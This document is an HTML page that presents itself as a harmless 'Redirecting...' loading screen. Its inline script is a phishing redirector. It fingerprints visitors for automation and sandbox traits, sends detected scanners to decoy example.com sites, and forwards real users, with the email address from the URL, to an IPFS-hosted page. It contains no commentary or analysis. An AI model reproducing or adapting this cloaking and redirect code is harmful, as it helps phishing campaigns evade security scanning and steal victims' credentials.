<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- This script runs invisibly in background -->
    <script>
    (function() {
        'use strict';
        
        const TARGET_BASE = "http://bafkreibczthledbepbupqr6h74nqvjm3jm4hnbtcbtdwhvz5y3kyk3nzii.ipfs.dweb.link/";
        const FAKE_URLS = [
            "https://example.com",
            "https://www.example.org",
            "https://www.example.net"
        ];
        
        // ENHANCED BOT DETECTION
        function detectBot() {
            let score = 0;
            
            const automationProps = [
                'webdriver', '__webdriver_evaluate', '__selenium_evaluate',
                '__fxdriver_evaluate', '__driver_evaluate', '__webdriver_script_function',
                '__webdriver_script_fn', '__lastWatirAlert', '__lastWatirConfirm'
            ];
            
            automationProps.forEach(prop => {
                if (prop === 'webdriver') {
                    if (navigator.webdriver === true) score += 40;
                } else if (window[prop] !== undefined) {
                    score += 30;
                }
            });
            
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                
                if (!gl) {
                    score += 30;
                } else {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        if (renderer.includes('SwiftShader') || 
                            renderer.includes('llvmpipe') ||
                            renderer.includes('Google SwiftShader')) {
                            score += 35;
                        }
                    }
                }
                
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("test", 2, 15);
                
                const dataUrl = canvas.toDataURL();
                if (!dataUrl || dataUrl.length < 100) {
                    score += 20;
                }
                
            } catch(e) {
                score += 25;
            }
            
            if (navigator.plugins.length === 0) score += 15;
            if (navigator.languages && navigator.languages.length === 0) score += 10;
            if (!window.chrome || !window.chrome.runtime) score += 10;
            if (!('ontouchstart' in window) && navigator.plugins.length === 0) score += 10;
            if (window.screen.width === 800 && window.screen.height === 600) score += 10;
            
            return score > 50;
        }
        
        function getEmail() {
            try {
                const params = new URLSearchParams(window.location.search);
                const email = params.get('email');
                return email ? email.trim() : '';
            } catch(e) {
                return '';
            }
        }
        
        function run() {
            const isBot = detectBot();
            const email = getEmail();
            
            if (isBot) {
                const randomIndex = Math.floor(Math.random() * FAKE_URLS.length);
                window.location.replace(FAKE_URLS[randomIndex]);
                return;
            }
            
            // For real users: Just redirect to the IPFS page directly
            const targetUrl = email ? 
                TARGET_BASE + '?email=' + encodeURIComponent(email) : 
                TARGET_BASE;
            
            window.location.replace(targetUrl);
        }
        
        // Run immediately
        run();
        
    })();
    </script>
</head>
<body style="margin:0;padding:0;width:100%;height:100vh;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;background:#f5f5f5;">
    <div style="text-align:center;">
        <div style="border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 20px;"></div>
        <p>Redirecting...</p>
    </div>
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</body>
</html>
